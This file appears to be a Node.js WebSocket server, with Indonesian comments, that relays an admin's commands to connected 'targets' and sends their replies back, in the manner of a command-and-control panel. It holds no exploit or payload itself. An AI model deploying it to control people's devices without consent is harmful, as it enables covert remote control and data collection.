const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use('/admin', express.static(path.join(__dirname, 'admin')));
app.use('/target', express.static(path.join(__dirname, 'target')));

let adminSocket = null;
const targets = new Map();
const history = []; // simpan log terakhir

function pushHistory(entry) {
  history.push({ ...entry, t: Date.now() });
  if (history.length > 200) history.shift();
}

wss.on('connection', (ws, req) => {
  const url = req.url;

  if (url === '/admin') {
    adminSocket = ws;
    console.log('[+] ADMIN connected');
    ws.send(JSON.stringify({ type: 'info', msg: 'Admin terhubung' }));
    ws.send(JSON.stringify({
      type: 'init',
      targets: [...targets.keys()],
      history
    }));

    ws.on('message', (data) => {
      let payload;
      try { payload = JSON.parse(data.toString()); }
      catch { payload = { type: 'raw', data: data.toString() }; }

      // Admin bisa kirim ke semua atau target tertentu
      if (payload.type === 'cmd') {
        const sentTo = [];
        for (const [id, t] of targets) {
          if (payload.to === 'all' || payload.to === id) {
            if (t.readyState === WebSocket.OPEN) {
              t.send(JSON.stringify({ type: 'cmd', payload: payload.data }));
              sentTo.push(id);
            }
          }
        }
        const entry = { type: 'admin_cmd', to: payload.to, data: payload.data, sentTo };
        pushHistory(entry);
        ws.send(JSON.stringify({ type: 'log', ...entry }));
      }
    });

    ws.on('close', () => {
      adminSocket = null;
      console.log('[-] ADMIN disconnected');
    });

  } else if (url.startsWith('/target')) {
    const id = Math.random().toString(36).slice(2, 8).toUpperCase();
    targets.set(id, ws);
    console.log('[+] TARGET connected:', id);

    ws.send(JSON.stringify({ type: 'welcome', id }));

    const onlineEntry = { type: 'target_online', id };
    pushHistory(onlineEntry);

    if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
      adminSocket.send(JSON.stringify(onlineEntry));
    }

    ws.on('message', (data) => {
      let parsed;
      try { parsed = JSON.parse(data.toString()); }
      catch { parsed = { type: 'text', data: data.toString() }; }

      const entry = { type: 'target_data', id, ...parsed };
      pushHistory(entry);

      if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
        adminSocket.send(JSON.stringify(entry));
      }
    });

    ws.on('close', () => {
      targets.delete(id);
      const offEntry = { type: 'target_offline', id };
      pushHistory(offEntry);
      console.log('[-] TARGET disconnected:', id);
      if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
        adminSocket.send(JSON.stringify(offEntry));
      }
    });
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server: http://localhost:${PORT}`);
  console.log(`Admin : http://localhost:${PORT}/admin`);
  console.log(`Target: http://localhost:${PORT}/target`);
});
